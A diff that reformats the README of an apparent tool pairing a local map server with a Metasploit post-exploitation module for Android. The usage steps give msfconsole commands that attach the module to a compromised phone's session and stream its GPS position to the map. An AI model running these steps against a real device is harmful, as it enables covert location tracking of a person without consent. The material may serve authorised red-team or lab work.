@@ -29,40 +29,52 @@ Local telemetry ingestion server and Metasploit post-exploitation module.
 
 ## Setup
 
-1. Fetch and verify offline Leaflet assets:
-   ```sh
-   make
-   ```
-2. Install the Metasploit post module into your local tree
-   (`~/.msf4/modules`):
-   ```sh
-   make install-local
-   ```
+### 1. Fetch and verify offline Leaflet assets.
+
+```sh
+make
+```
+
+### 2. Install the Metasploit post module into your local tree (`~/.msf4/modules`):
+
+```sh
+make install-local
+```
 
 ## Usage
 
-1. Start the Map Server:
-   ```sh
-   python3 map_server.py
-   ```
-   Open <http://127.0.0.1:8765> in a browser.
-   (Requires internet connection for OpenStreetMap tiles).
-2. Run the Metasploit Streamer.
-   In `msfconsole`:
-   ```
-   msf6 > reload_all
-   msf6 > use post/android/gather/gps_streamer
-   msf6 post(android/gather/gps_streamer) > set SESSION <id>
-   msf6 post(android/gather/gps_streamer) > set INTERVAL 3
-   msf6 post(android/gather/gps_streamer) > run -j
-   ```
-3. Manual Testing (`curl`).
-   To test the ingestion server without an active session:
-   ```sh
-   curl -fsS http://127.0.0.1:8765/api/position \
-        -H 'Content-Type: application/json' \
-        -d '{"lat":47.000,"lon":28.000}'
-   ```
+### 1. Start the Map Server.
+
+```sh
+python3 map_server.py
+```
+
+Open <http://127.0.0.1:8765> in a browser.
+
+> [!IMPORTANT]
+> Requires internet connection for OpenStreetMap tiles.
+
+### 2. Run the Metasploit Streamer.
+   
+In `msfconsole`:
+
+```
+msf6 > reload_all
+msf6 > use post/android/gather/gps_streamer
+msf6 post(android/gather/gps_streamer) > set SESSION <id>
+msf6 post(android/gather/gps_streamer) > set INTERVAL 3
+msf6 post(android/gather/gps_streamer) > run -j
+```
+
+### 3. Manual Testing (`curl`).
+
+To test the ingestion server without an active session:
+
+```sh
+curl -fsS http://127.0.0.1:8765/api/position \
+     -H 'Content-Type: application/json' \
+     -d '{"lat":47.000,"lon":28.000}'
+```
 
 ## Specifications
 
